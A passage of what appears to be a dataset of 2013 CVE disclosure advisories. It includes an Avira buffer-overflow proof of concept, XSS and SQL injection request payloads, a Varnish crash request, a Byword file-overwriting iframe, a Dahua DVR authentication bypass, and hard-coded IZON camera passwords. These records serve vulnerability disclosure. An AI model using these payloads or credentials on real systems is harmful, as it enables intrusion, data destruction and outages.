0043F0ED PUSH DWORD PTR SS:[EBP+C] ; |Subkey
0043F0F0 MOV BYTE PTR SS:[EBP-1],BL ; |
0043F0F3 PUSH DWORD PTR SS:[EBP+8] ; |hKey
0043F0F6 MOV DWORD PTR SS:[EBP-C],820 ; |
0043F0FD CALL ESI ; RegOpenKeyExW
0043F0FF MOV EDI,DWORD PTR DS:[<&ADVAPI32.RegQuer>;
ADVAPI32.RegQueryValueExW
0043F105 TEST EAX,EAX
0043F107 JNZ SHORT Avira_Se.0043F133
0043F109 LEA EAX,DWORD PTR SS:[EBP-C]
0043F10C PUSH EAX ; /pBufSize
0043F10D PUSH DWORD PTR SS:[EBP+14] ; |Buffer
0043F110 LEA EAX,DWORD PTR SS:[EBP-10] ; |
0043F113 PUSH EAX ; |pValueType
0043F114 PUSH EBX ; |Reserved => NULL
0043F115 PUSH DWORD PTR SS:[EBP+10] ; |ValueName
0043F118 PUSH DWORD PTR SS:[EBP-8] ; |hKey
0043F11B CALL EDI ; RegQueryValueExW
0043F11D TEST EAX,EAX
0043F11F JNZ SHORT Avira_Se.0043F125
0043F121 MOV BYTE PTR SS:[EBP-1],1
0043F125 PUSH DWORD PTR SS:[EBP-8] ; /hKey
0043F128 CALL DWORD PTR DS:[<&ADVAPI32.RegCloseKe>; RegCloseKey
0043F12E CMP BYTE PTR SS:[EBP-1],BL
0043F131 JNZ SHORT Avira_Se.0043F16E
0043F133 LEA EAX,DWORD PTR SS:[EBP-8]
0043F136 PUSH EAX
0043F137 PUSH 20119
0043F13C PUSH EBX
0043F13D PUSH DWORD PTR SS:[EBP+C]
0043F140 PUSH DWORD PTR SS:[EBP+8]
0043F143 CALL ESI
0043F145 TEST EAX,EAX
0043F147 JNZ SHORT Avira_Se.0043F16E
0043F149 LEA EAX,DWORD PTR SS:[EBP-C]
0043F14C PUSH EAX
0043F14D PUSH DWORD PTR SS:[EBP+14]
0043F150 LEA EAX,DWORD PTR SS:[EBP-10]
0043F153 PUSH EAX
0043F154 PUSH EBX
0043F155 PUSH DWORD PTR SS:[EBP+10]
0043F158 PUSH DWORD PTR SS:[EBP-8]
0043F15B CALL EDI
0043F15D TEST EAX,EAX
0043F15F JNZ SHORT Avira_Se.0043F165
0043F161 MOV BYTE PTR SS:[EBP-1],1
0043F165 PUSH DWORD PTR SS:[EBP-8] ; /hKey
0043F168 CALL DWORD PTR DS:[<&ADVAPI32.RegCloseKe>; RegCloseKey
0043F16E XOR EAX,EAX
0043F170 CMP BYTE PTR SS:[EBP-1],BL
0043F173 POP EDI
0043F174 POP ESI
0043F175 SETNE AL
0043F178 POP EBX
0043F179 LEAVE
0043F17A RETN
6. PROOF-OF-CONCEPT (CODE / EXPLOIT)
------------------------------------
Use the following code to exploit the vulnerability:
#!/usr/bin/python
file=""poc.reg""
junk1=""xCC"" * 1240
poc=""Windows Registry Editor Version 5.00 ""
poc=poc + ""[HKEY_CURRENT_USERSoftwareAvira Secure Backup] ""
poc=poc + """"AutoUpdateProgressFilename""="""" + junk1 + """"""
try:
print ""[*] Creating exploit file... "";
writeFile = open (file, ""w"")
writeFile.write( poc )
writeFile.close()
print ""[*] File successfully created!"";
except:
print ""[!] Error while creating file!"";
7. SOLUTION
-----------
Update to v1.0.0.2 Build 3630 or later
8. REPORT TIMELINE
------------------
2013-10-30: Discovery of the vulnerability
2013-11-03: RCE Security sends first notification to vendor via mail
with disclosure date set to 18. November 2013
2013-11-03: MITRE assigns CVE-2013-6356 for this issue
2013-11-04: Vendor ACKs the vulnerability
2013-11-10: RCE Security asks for a status
2013-11-11: Vendor expects to receive a fix the same day
2013-11-13: Vendor releases v1.0.0.2 Build 3630 which fixes CVE-2013-6356
2013-11-16: Coordinated Disclosure
9. REFERENCES
-------------
http://www.rcesecurity.com/2013/11/cve-2013-6356-avira-secure-backup-v1-0-0-1-buffer-overflow-anatomy-of-a-vulnerability/"
7727,Dahua DVR Authentication Bypass - CVE-2013-6117,,CVE-2013-6117,"Dahua DVR Authentication Bypass - CVE-2013-6117
--Summary--
Dahua web-enabled DVRs and rebranded versions do not enforce authentication on their administrative services.
# Zhejiang Dahua Technology Co., Ltd.
# http://www.dahuasecurity.com
--Affects--
# Dahua web-enabled DVRs
# Dahua-rebranded web-enabled DVRs
# Verified on v2.608.0000.0 and 2.608.GV00.0
--Details--
Dahua web-enabled DVRs utilize fat-client utilities like PSS, mobile client interfaces like iDMSS, and an ActiveX control, ""webrec.cab"" for browser-based access. These clients communicate with an administrative service which runs on TCP port 37777 by default and can be changed. At least in the case of the ActiveX control, a simple binary protocol is used. The various commands supported by the server are not authorized in any way. Authentication simply serves as a way to let the client transition past the login screen. Various commands can be replayed to any DVR sans authentication. These include:
# Get the firmware version
# Get the serial number
# Get the email settings (includes username, SMTP server, and cleartext creds)
# Get the DDNS settings (includes the DDNS service, server, and cleartext creds)
# Get the NAS settings (again, cleartext creds)
# Get the users (username, group membership, and hashed passwords)
# Get the user groups (group name, description, etc)
# Get the channels (camera channel names, e.g. ""bedroom"" ""cocina"")
# Clear the logs (handy)
# Change a user's password (unauthorized access)
More Details: http://blog.depthsecurity.com/2013/11/dahua-dvr-authentication-bypass-cve.html
--MetaSploit Module--
We wrote a MetaSploit scanner module as a proof of concept. It is multithreaded and can look for a specified port, scan networks, find DVRs, get all the above info, change a user's password, and clear the logs when it's through.
# GIT Repo: https://github.com/depthsecurity/dahua_dvr_auth_bypass.git
--Other Concerns--
# Some nearly simultaneous research independent of mine: http://www.kb.cert.org/vuls/id/800094
# CVE-2013-3612: DVRs listen for telnet by default and the root password is static and publicly known on all devices. (http://www.cctvforum.com/viewtopic.php?f=3&t=32408)
# Other backdoor accounts exist, including one with a revolving password that is a simple date hash.
# CVE-2013-3613: UPnP requests from untrusted addresses is supported and could be used to get publicly accessible telnet on a DVR.
# CVE-2013-3614: Passwords are limited to 6 chars.
# CVE-2013-3615: A weak 48-bit hash is utilized to protect DVR account passwords.
# We admittedly did not perform any serious fuzzing of the vulnerable service so there is a large potential for more serious vulnerabilities that allow RCE.
# Also, the DVRs listen on many different ports including telnet besides those necessary for web access (TCP/80,37777,&37778 by default).
# SMTP, NAS, and DDNS credentials were all stored and transferred in cleartext.
--Mitigation--
The best advice for now is to make sure these devices are not publicly accessible to the internet. Dahua initially stated they would work on fixing the issues but went radio silent afterwards.
--Timeline--
# 8/26/2013: Identified authorization flaw
# 8/27/2013: Wrote proof of concept tool/scanner
# 8/28/2013: Disclosed issue to Dahua
# 8/30/2013: Received initial response from Dahua including request for more info
# 8/30/2013: Responded to Dahua with requested info
# 9/2/2013: Received confirmation that Dahua R&D is working to fix the issue
# 10/2/2013: Requested status update from Dahua
# 10/10/2013: Re-requested status update from Dahua after no response from 10/2/2013
# 11/13/2013: Publicly disclosed vulnerability
Jake Reynolds - Partner / Principal Consultant"
7755,"CVE-2013-4425: Private key disclosure, Osirix (lite, 64bit and FDA cleader version) (Medical Application)",,CVE-2013-4425,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Private key disclosure, Osirix (lite, 64bit and FDA cleader version)
CVE-2013-4425 (version 1.09)
CVSS Score: 8.4
Background:
===========
OsiriX is an image processing software dedicated to DICOM images (files
with a "".dcm"" / "".DCM"" extension) produced by imaging equipment (MRI, CT,
PET, PET-CT, SPECT-CT, Ultrasounds) commonly used in medical settings.
Certain versions are FDA or otherwise approved for clinical/medical use.
The product is normally configured to connect to a Picture Archiving and
Communication System (PACS) over the network; using protocols such as
DICOM and the HTTP(s) based WADO.
These connections are commonly secured with Transport Layer Security
(TLS). OsiriX requires a public private key pair in order to do so (X509
certificate and corresponding private key).
Required Environment:
=====================
This advisory only applies to OsiriX installations which use TLS for
securing their network connection in conjuction with a strong digital
identity (e.g. a medical-care account, pass, medical-id).
Vulnerability:
==============
During startup of the DICOM listener the private key is extracted (from
the generally well protected/encrypted keychain, chip-card or
similarly), copied and then written to a file on the file system.
Then it is perfunctory encrypted with a password that is
hardcoded to 'SuperSecretPassword'.
The resulting file (and the entire (directory) path) have read
permissions which are totally open (user, group and other).
This means that other users, daemons or subsystems on the same
workstation as OsiriX, systems that have mounted/visibility of the path;
or systems that are able to put a symbolic link in the path, can obtain
the private key.
Details:
========
The private and public key are extracted and written out as a temporary
PKCS#12 file (through NSData writeToFile:). This file is then passed to
the (hardcoded) path /usr/bin/openssl; where openssl its subcommand
'pkcs12' is used to split the file into a PEM encoded public and private
key (fopen(2) with permissive O_NOFOLLOW, O_SYMLINK). The latter is
perfunctory encrypted with 'SuperSecretPassword'. This password is
visible in the binary and passed as a command line parameter (i.e.
visible to 'ps(1)') during execution.
The PKCS#12 is then removed. The various write operations honour things
such as tilde expansion and (symbolic) links; thus allowing a fair
degree of control for the attacker to re-position the file on a visible
location (shared volume, a local webserver, a java(script)/browser
visible location, an internet cache). Especially as the path itself is
also writable for user, group and other.
Impact:
=======
Full disclosure of the users private key. And hence full negation of any
and all privacy and authentication security measures of the TLS channel.
The attacker can impersonate the user and/or decrypt (past) communications.
As it is common in medical settions to use a single (personal) x509
certificate for enterprise/hospital wide authentication and privacy
protection; the attacker will also gain access to all other systems
thus protected.
Work around or mitigation for existing installations:
=====================================================
None (other than disabling the use of TLS/security).
Solution:
=========
Mitigate by Upgrading to version 5.8.2 or 2.5-MD.
As per version 5.8/2.5-MD, vendor no longer uses the hardcoded
'SuperSecretPassword', but instead generates dynamic token which is held
in in-process memory; and otherwise not saved directly.
Therefore upgrading to U2.5-MD mitigates this issues. This is documented
in the vendors release notes as:
[MD-670] - CVE-2013-4425 : Private key disclosure, Osirix
Note that this mitigation does not address subsequent security
issues such as the VM paging these out, inter process memory visibility
and so on). Furthermore, during execution of the /usr/bin/openssl
command; the password is part of the command line and hence visible to
tools such as 'ps(1)' to all users on the system.
This fix has not yet been propagated to the unsupported open-source
version; and no timeline for this is available at the time of this
release.
Versions affected:
==================
All versions up to and including 5.7.1/2.7-MD The fix was introduced in
version 5.8 and 2.8-MD.
Vendor contact:
Pixmeo SARL
266 Rue de Bernex
CH-1233 Bernex
Switzerland
Caveats and Vendor certifications affected:
===========================================
OsiriX MD is cleared as a 510k class II medical device, according to US
Food And Drug Regulation CFR21 part 820
(http://www.accessdata.fda.gov/cdrh_docs/pdf10/K101342.pdf).
OsiriX MD complies with European Directive 93/42/EEC concerning medical
devices. Under this directive, it is regarded as a class IIa (CE-0029,
Apra Gaz, Bruxelles, Belgium) product.
Both these certifications set out requirements for (good) manufacturing
practices. Therefore this mitigation may not fully resolve the issues
when judged against normal industry best practices and/or regulatory
requirements for private key handling in certain countries.
This because the applied mitigation does still require the extraction
of a private key to process memory; as opposed to making use of the
normal OSX cryptographic primitives within a hardware/soft-token
security sandbox. And it does expose the password of the keyfile as a
command line argument (which is hard coded to the OS its own OpenSSL
binary; which is well protected), albeit very very shortly.
Timeline and disclosure:
========================
2013-10-15 Issue confirmed, CVE issued, issue reported to vendor.
2013-10-16 Vendor response; will push out a fix as part of a
planned release by/around mid December 2013.
2013-11-02 Vendor released 5.8, 2.8-MD
2013-11-06 First disclosure, version 1.09
Bibliographic References and classification:
===========================================
@techreport{CVE-2013-4425,
Number = {CVE-2013-4425},
Title = {Private key disclosure, Osirix (lite, 64bit and FDA cleader version)},
Author = {Dirk-Willem van Gulik},
Institution = {WebWeaving.org},
Month = {11}, Year = {2013},
Type = {Vulnerability Report, Responsible Full Disclosure},
Address = {Janvossensteeg 37, 2312WC, Leiden, Netherlands}
}
CVSSv2: AV:L/AC:L/Au:N/C:C/I:N/A:P/E:H/RL:U/RC:C/CDP:H/TD:H
CVSS Base Score 7.2
Impact Subscore 10.0
Exploitability Subscore 3.9
CVSS Temporal Score 6.8
CVSS Environmental Score 8.4
Modified Impact Subscore 10.0
Overall CVSS Score 8.4
Credits:
========
Dirk-Willem van Gulik (dirkx (at) webweaving (dot) org) as part of the
Artemis/EU project HighProfile (http://www.highprofile-project.eu/).
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (Darwin)
Comment: This message is encrypted and/or signed with PGP (gnu-pg, gpg). Contact dirkx webweaving org if you cannot read it.
iQCVAwUBUnpiGDGmPZbsFAuBAQKgIQQAlNL3yA5d9PgW/jMHuCxniu/GyfW2nV1z
NI2qJSgCKUIkOwClvbtrDgYYx41tIfRVxEgWXB9i7sIY/9FckmwMoNevwFj7bAn7
yxyfXEUQV3Kw7ZNDQc4VlR/Xlp1yFuqFeOI+3t3RpYyDcd1NUf3wCqIqFKTWtCm4
C/nXoPXoUNA=
=TO0u
-----END PGP SIGNATURE-----"
7767,Cisco Mars Cross-Site Scripting Vulnerability - CVE-2013-5563,,CVE-2013-5563,"Vulnerability Type: Cross-Site Scripting
CVE: CVE-2013-5563
Products and affected versions:
Cisco Security Monitoring, Analysis and Response System (CS-MARS) - All versions
Vendor Website:
http://www.cisco.com/en/US/products/ps6241/
Cisco Advisory:
https://tools.cisco.com/bugsearch/bug/CSCul16173
=================
Vulnerability Details
=================
A Cross Site Scripting vulnerability has been found in Cisco Security Monitoring, Analysis and Response System. The issue is due to the input passed via several fields (eg: isnowLatency) to the /Query/NewQueryResult.jsp page are not properly sanitised before being returned to the user. Other pages could be affected by this issue.
This could exploited to inject arbitrary javascript in the context of an affected user in order to perform some actions when a logged-in user visits a specially crafted web page. For example to manipulate a client session, to execute administrative task, to impersonate a legitimate user in order to view or alter user data, or to perform transactions as that user.
The vulnerability has been tested on Cisco Mars version. Other versions result affected by this vulnerability.
=================
Proof Of Concepts
=================
PoC-1: Test XSS:
https://cisco_Mars_Site/Query/NewQueryResult.jsp?QueryIndex=0&isLowLatency=no""><script>alert(""Vulnerable"")</script>
=========
Solutions
=========
As CS-MARS reached the End of Software Maintenance milestone on April 11th, 2009, Cisco will not be releasing software or patches that mitigate the reported cross-site scripting vulnerability.
More information available at:
http://www.cisco.com/en/US/products/ps6241/prod_eol_notices_list.html
================
Other References
================
Cisco:
https://tools.cisco.com/bugsearch/bug/CSCul16173
SmartNet:
http://research.smartnetsecurity.net/advisory/-smt-sa-2013-02-cisco-mars-cross-site-scripting-vulnerability
==============
Credits/Author
==============
Giovanni Delvecchio
SmartNet s.r.l.
==========
Disclaimer
==========
All information is provided without warranty. The intent is to
provide information to secure infrastructure and/or systems, not
o be able to attack or damage. Therefore SmartNet s.r.l shall
not be liable for any direct or indirect damages that might be
caused by using this information."
7788,[CVE-2013-4484] DoS vulnerability in Varnish HTTP cache,,CVE-2013-4484,"Summary
=======
Varnish Cache with certain configurations is vulnerable to a denial
of service attack.
Three lines of VCL code solves the problem.
This issue was discovered by Ilia Sharov, Yandex.
This has been assigned CVE-2013-4484.
Details
=======
If Varnish receives a certain illegal request, and the subroutine
'vcl_error{}' restarts the request, the varnishd worker process
will crash with an assert.
The varnishd management process will restart the worker process,
but there will be a brief interruption of service and the cache
will be emptied, causing more traffic to go to the backend.
We are releasing this advisory because restarting from vcl_error{}
is both fairly common and documented.
This is purely a denial of service vulnerability, there is no risk
of privilege escalation.
Proof of concept
================
Given a VCL with the effect of:
sub vcl_error {
return(restart);
}
and a malformed HTTP request like:
GET<SP><SP><SP><CR><NL>
Host:<SP>foo<CR><NL>
<CR><NL>
Varnish will assert and restart the child process.
(The precise number of spaces after GET is not magic.)
Cause
=====
A malformed request should never reach the VCL processing in Varnish
in the first place, but for historical reasons we used vcl_error{}
to deliver the error-response for some malformed requests.
In future versions of Varnish, (4.x, 3.0.5) a standard summary 400
response will be returned for all requests which cannot be parsed
correctly, without VCL involvement.
Workaround
==========
Insert this at the top of your VCL file:
sub vcl_error {
if (obj.status == 400 || obj.status == 413) {
return(deliver);
}
}
Or add this test at the top of your existing vcl_error{}.
Versions affected
=================
At least 2.0.x, 2.1.x, 3.0.x, possibly also older versions.
--
Poul-Henning Kamp | UNIX since Zilog Zeus 3.20
phk FreeBSD ORG | TCP/IP since RFC 956
FreeBSD committer | BSD since 4.3-tahoe
Never attribute to malice what can adequately be explained by incompetence."
7796,Stem Innovation ‘IZON’ Hard-coded Credentials (CVE-2013-6236),,CVE-2013-6236,"Stem Innovation ‘IZON’ Hard-coded Credentials (CVE-2013-6236)
Mark Stanislav - mstanislav duosecurity com
I. DESCRIPTION
---------------------------------------
Stem Innovation's IP camera called ‘IZON’ utilizes numerous hard-coded credentials within its Linux distribution and also the hidden web application running on the camera. These sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the camera. Further, using the web interface credentials will provide access to a camera stream and configuration details, including third-party API keys.
II. TESTED VERSION
---------------------------------------
iOS Mobile Application: 1.0.5
Camera Firmware: 2.0.2
III. PoC EXPLOIT
---------------------------------------
1) Telnet Credentials
* ""root"" with a password of ""stemroot""
* ""admin"" with a password of ""/ADMIN/""
* ""mg3500"" with a password of ""merlin""
2) HTTP Credentials (http://camera-ip/mobileye/)
* ""user"" with a password of ""user""
IV. SOLUTION
---------------------------------------
Update to the latest firmware and hope for the best.
V. REFERENCES
---------------------------------------
https://blog.duosecurity.com/2013/10/izon-ip-camera-hardcoded-passwords-and-unencrypted-data-abound/
https://securityledger.com/2013/10/apple-store-favorite-izon-cameras-riddled-with-security-holes/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6236
VI. TIMELINE
---------------------------------------
09/06/2013 - Initial vendor contact stating I wanted to discuss a variety of security issues
09/06/2013 - Vendor’s help desk responded and asked for clarification about my request
09/06/2013 - Responded to the vendor’s help desk and reaffirmed my purpose for contact
09/16/2013 - Updated my existing help desk ticket after not hearing back in 10 days
09/19/2013 - Received a response back to contact their CEO directly about these issues
09/19/2013 - E-mailed the vendor’s CEO with synopsis details and severity ratings for the key issues
09/30/2013 - I opened up a new help desk ticket to follow-up after not hearing from their CEO after 11 days
10/01/2013 - The new case was updated saying that their CEO was aware of my email and would respond
10/03/2013 - I received a follow-up from their CTO with no specific details about plans to fix issues
10/03/2013 - Followed-up with the CTO to ask for specific details about the issues I had found
10/14/2013 - CTO responded asking to “meet” to discuss my findings but again offered no details
10/14/2013 - Offered up time ranges for the next day that were viable to discuss my findings
10/17/2013 - Public presentation of camera research which included these issues
10/28/2013 - Still no response from vendor on confirmation of fixes or a timeline to do so"
7803,CVE-2013-5694 Blind SQL Injection in Ops View,,CVE-2013-5694,"CVE-2013-5694 Blind SQL Injection in Ops View
Version(s): Opsview pre 4.4.1
Author: J. Oquendo (joquendo at e-fensive dot net)
I. ADVISORY
Title: Blind SQL Injection in OpsView
Date published: 2013-10-28
Vendor contacted: 2013-09-04
II. BACKGROUND
Opsview is a systems management software built on open
source software. To minimize noise, read more about it
here
http://www.opsview.com/about-us
II. DESCRIPTION
A Blind SQL injection vulnerability exists in OpsView
""acknowledge"" function. A malicious user can post bad data
leading to a database dump, user creation, code execution,
etc.
POST /status/service/acknowledge HTTP/1.1
Content-Length: 118
Content-Type: application/x-www-form-urlencoded
Host: 10.20.30.68:80
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Opera/5.54 (Windows NT 5.1; U) [en]
comment=&from=http%3a%2f%2f10.20.30.68%2fstatus%2fhostgroup&notify=1&service_selection=%24%7dsql injection goes
here%7d&submit=Submit
For more on BSQLI read about it here:
http://en.wikipedia.org/wiki/SQL_injection#Blind_SQL_injection
III SOLUTION
Opsview released a fix with Opsview 4.4.1
http://docs.opsview.com/doku.php?id=opsview4.4:changes#fixes
--
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
J. Oquendo
SGFA, SGFE, C|EH, CNDA, CHFI, OSCP, CPT, RWSP, GREM
""Where ignorance is our master, there is no possibility of
real peace"" - Dalai Lama
42B0 5A53 6505 6638 44BB 3943 2BF7 D83F 210A 95AF
http://pgp.mit.edu:11371/pks/lookup?op=get&search=0x2BF7D83F210A95AF"
7804,CVE-2013-5695 Multilple Cross Site Scripting (XSS) Attacks in Ops View,,CVE-2013-5695,"CVE-2013-5695 Multilple Cross Site Scripting (XSS) Attacks in Ops View
Version(s): Opsview pre 4.4.1
Author: J. Oquendo (joquendo at e-fensive dot net)
I. ADVISORY
Title: Multilple Cross Site Scripting (XSS) Attacks in Ops View
Date published: 2013-10-28
Vendor contacted: 2013-09-04
II. BACKGROUND
Opsview is a systems management software built on open
source software. To minimize noise, read more about it
here
http://www.opsview.com/about-us
II. DESCRIPTION
Opsview is vulnerable to a few different XSS based attacks.
/admin/auditlog
/info/host/
/login
/status/service/recheck
/viewport/
There are a variety of iterations within those functions
which may allow a malicious user to trigger a cross site
scripting attack.
III. EXAMPLE
GET /admin/auditlog/?id=1%3cScRiPt%20%3eprompt%28ohnoes%29%3c%2fMY XSS SCRIPT HERE%3e HTTP/1.1
Host: 10.20.30.68:80
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Opera/5.54 (Windows NT 5.1; U) [en]
------------
GET /info/host/1%3Cdiv%20style=width:expression(prompt(ohnoes))%3E
HTTP/1.1
Host: 10.20.30.68:80
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Opera/5.54 (Windows NT 5.1; U) [en]
------------
POST /login HTTP/1.1
Content-Length: 125
Content-Type: application/x-www-form-urlencoded
Host: 10.20.30.68:80
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Opera/5.54 (Windows NT 5.1; U) [en]
app=OPSVIEW&back=%22%20onmouseover%3dprompt%28ohnoes%29%20xss%3d%22&login=Sign+in&login_password=no&login_username=no
------------
POST /status/service/recheck HTTP/1.1
Content-Length: 144
Content-Type: application/x-www-form-urlencoded
User-Agent: Opera/5.54 (Windows NT 5.1; U) [en]
&from=%22%20onmouseover%3dprompt%28ohnoes%29%20xss%3d%22&host_selection=opsview&service_selection=opsview%3bConnectivity%20-%20LAN&submit=Submit
------------
GET /viewport/1%3Cdiv%20style=width:expression(prompt(ohnoes))%3E
HTTP/1.1
Host: 10.20.30.68:80
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Opera/5.54 (Windows NT 5.1; U) [en]
Host: 10.20.30.68:80
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Opera/5.54 (Windows NT 5.1; U) [en]
III SOLUTION
Opsview released a fix with Opsview 4.4.1
http://docs.opsview.com/doku.php?id=opsview4.4:changes#fixes
--
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
J. Oquendo
SGFA, SGFE, C|EH, CNDA, CHFI, OSCP, CPT, RWSP, GREM
""Where ignorance is our master, there is no possibility of
real peace"" - Dalai Lama
42B0 5A53 6505 6638 44BB 3943 2BF7 D83F 210A 95AF
http://pgp.mit.edu:11371/pks/lookup?op=get&search=0x2BF7D83F210A95AF"
7837,[CVE-2013-5702] Watchguard Server Center v11.7.4 Multiple Non-Persistent Cross-Site Scripting Vulnerabilities,,CVE-2013-5702,"Watchguard Server Center v11.7.4 Multiple Non-Persistent Cross-Site
Scripting Vulnerabilities
RCE Security Advisory
http://www.rcesecurity.com
1. ADVISORY INFORMATION
-----------------------
Product: Watchguard Server Center
Vendor URL: www.watchguard.com
Type: Cross-Site Scripting [CWE-79]
Date found: 2013-09-11
Date published: 2013-10-21
CVSSv2 Score: 3,5 (AV:N/AC:M/Au:S/C:N/I:P/A:N))
CVE: CVE-2013-5702
2. CREDITS
----------
These vulnerabilities were discovered and researched by Julien Ahrens
from RCE Security.
3. VERSIONS AFFECTED
--------------------
Watchguard Server Center v11.7.4 Update #1
and other older versions may be affected too.
4. VULNERABILITY DESCRIPTION
----------------------------
Multiple Non-Persistent Cross-Site Scripting vulnerabilities have been
identified in the Watchguard Server Center v11.7.4 Update #1.
Due to improper input - validation of the following GET parameters, an
attacker could temporarily inject arbitrary code with required
authenticated user interaction into the context of the Watchguard Server
Center / current browser session. Successful exploitation of these
vulnerabilities allows for example cookie theft, session hijacking or
client side context manipulation.
Vulnerable modules and parameters:
+/log/device?sn=random&cluster_id=<XSS>&l_t=tr&name=random
+/log/device?sn=random&cluster_id=random&l_t=tr&name=<XSS>
+/log/log_html_distribution?sn=random&cluster_id=random&name=<XSS>
5. PROOF-OF-CONCEPT (CODE / EXPLOIT)
------------------------------------
https://192.168.0.1:4130/log/device?sn=random&cluster_id=&l_t=tr&name=<script>alert('rcesecurity.com')</script>
6. SOLUTION
-----------
Update to Watchguard Server Center v11.8 which fixes these issues
7. REPORT TIMELINE
------------------
2013-09-05: Discovery of the vulnerability
2013-09-05: MITRE assigns CVE-2013-5702 for this issue
2013-09-11: RCE Security sends vulnerability details to Watchguard via mail
with disclosure date set to 26. September 2013
2013-09-12: Watchguard ACKs all reported flaws, assigns bug ids: #76179 and
#76363 and shows possible mitigation factors
2013-09-26: RCE Security provides a PoC bypassing the mitigation factors and
extends disclosure date to 17. October 2013
2013-09-30: RCE Security asks for status update
2013-10-10: Watchguard releases v11.8 which fixes all reported
vulnerabilities
2013-10-21: Responsible Disclosure
8. REFERENCES
-------------
http://www.rcesecurity.com/2013/10/cve-2013-5702-watchguard-server-center-v11-7-4-multiple-xss-vulnerabilities/
http://watchguardsecuritycenter.com/2013/10/17/xtm-11-8-secfixes/"
7936,[CVE-2013-5725] - Byword for iOS Data Destruction Vulnerability,,CVE-2013-5725,"- Affected Vendor: http://metaclassy.com/
- Affected Software: Byword for iOS
- Affected Version: 2.x prior to 2.1
- Issue Type: Lack of validation/user confirmation leading to destruction of data
- Release Date: 29 Sept 2013
- Discovered by: Guillaume Ross
- CVE Identifier: CVE-2013-5725
- Issue Status: Vendor has published version 2.1 which adds a confirmation prompt to prevent the issue.
**Summary**
Byword is a text editor for iOS and OS X that can use iCloud or Dropbox to sync documents.
Byword supports actions through X-URLs on iOS.
One of the supported action replaces a file with the value passed through the URL.
**Description**
The Replace file action in the affected version does not warn the user and replaces the content of the target file with text specified in the X-URL.
The attacker must know the path to the file, but considering iCloud does not have subfolders, it makes it easier to guess filenames such as ""todo.txt"" file or an ""important.txt"" file, or the attacker could have received a file created by the victim using Byword and can guess the filename from the title.
**Impact**
The file can be overwritten and the data could be lost permanently.
**Proof of Concept**
byword://replace?location=icloud&path=&name=Important.txt&text=haha
This URL would replace the content of the file ""Important.txt"" in the user's iCloud container for Byword with ""haha"". By using iframes, the attacker can embed this attack in a web page. Safari on iOS will automatically launch Byword and overwrite the file.
<iframe src=""byword://replace?location=icloud&path=&name=Important.txt&text=haha""></iframe>
**Response Timeline**
- August 26 2013 - Vendor notified
- August 26 2013 - Vendor acknowledges vulnerability
- September 18 2013 - Update released that adds a warning/confirmation screen
- September 29 2013 - Advisory released"
7965,CVE-2013-5118 - XSS Good for Enterprise iOS,,CVE-2013-5118,"Hello,
Last month I identified a XSS vulnerability in the Good for Enterprise iOS application.
The vulnerable versions are v2.2.2.1611 and earlier
Proof of Concept:
HTML Email including the following payload will execute Javascript statements when the victim open the email using the vulnerable version.
Payload:
<body>
<div>
<script>alert('XSS Here')</script>
</div>
</body>
Remediation:
I worked with the Good people to close the issue, I provided some guidance and feedback and agreed with them to not disclose it until they fix it.
The new release is now available:
Update the ""Good for Enterprise"" iOS application to 2.2.4.1659 or newer
References:
https://www.roblest.com/#research:CVE-2013-5118
Can the comunity please provide feedback and comments in order to ensure the fix is working well
Many thanks
Mario"
7984,CVE-2013-5210 Adtran Netvanta Remote Code Injection via XSS,,CVE-2013-5210,"Multiple Vulnerabilities in the Adtran Netvanta 7100
Impact: Multiple Local and Remote Compromise, XSS and
other Injection Attacks
Version(s): firmware prior to R10.5.3.HA
Author: J. Oquendo (joquendo at e-fensive dot net)
I. ADVISORY
Title: Multiple Vulnerabilities in Adtran Netvanta 7100
Date published: 2013-09-18
Vendor contacted in 2011
CVE-2013-5210 Remote Code Injection via XSS
II. BACKGROUND
The Adtran Netvanta 7100 (NV7100) is an ""Office in a Box""
appliance offering data and VoIP services on a single
platform. In October 2011, I discovered there were some
vulnerabilities in the platform and contacted the vendor.
The initial disclosure revolved primarily around cross
site scripting attacks, where via crafted URIs an attacker
would have been able to trick users into performing a
variety of attacks, local to the users machine, or, if
given enough privileges, re-directed back to the NV7100.
After disclosing the issue, Adtran began fixing up these
initial issues however, in parallel, I then found others
which were similar in nature, but affecting other areas
of the NV7100.
II. DESCRIPTION
For a description of XSS, injection attacks, authentication
bypass, please see OWASP material on this subject.
https://www.owasp.org/index.php/Testing_for_Bypassing_Authentication_Schema_%28OWASP-AT-005%29
https://www.owasp.org/index.php/XSS
The NV7100's main issue (and the reason for the LONG release
of a patch) revolved around userapp/loginAction.html where
an attacker was able to inject code regardless of
authenticating. In the initial report, there was some
miscommunication on my behalf, as well as some vendor
misinterpretation of what was occurring. An attacker DOES
NOT NEED credentials to pull off a successful attack and
no POC code will be made publicly available to demonstrate.
The vendor was given a video that illustrated the who,
what, when, where and why.
III SOLUTION
Adtran released a firmware update, and advisory of their
own to resolve this issue however, in the interim, these
appliances should NEVER face the public internet, and
should be isolated via VLANs or firewalls to minimize abuse.
https://supportforums.adtran.com/docs/DOC-6414
IV. TOOLS USED
Wikto, Burpsuite, WVS, perl kung fu, Firefox
V. History
This was reported in 2011 and throughout the past two years,
Adtran has been fixing the issues I have been coming across.
Initially, the advisory began with over 52 different means
of attacks and over the course of two years, Adtran has
diligently addressed each and every vulnerability, as
recently as August 2013. While I would have preferred
placing a timeline, the reality is, two years is a long time
to go back and forth with a vendor on security issues.
VI. Renegotiation
There was also an SSL renegotation issue that was discovered
and addressed during the process of sorting out the XSS
issues.
--
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
J. Oquendo
SGFA, SGFE, C|EH, CNDA, CHFI, OSCP, CPT, RWSP, GREM
""Where ignorance is our master, there is no possibility of
real peace"" - Dalai Lama
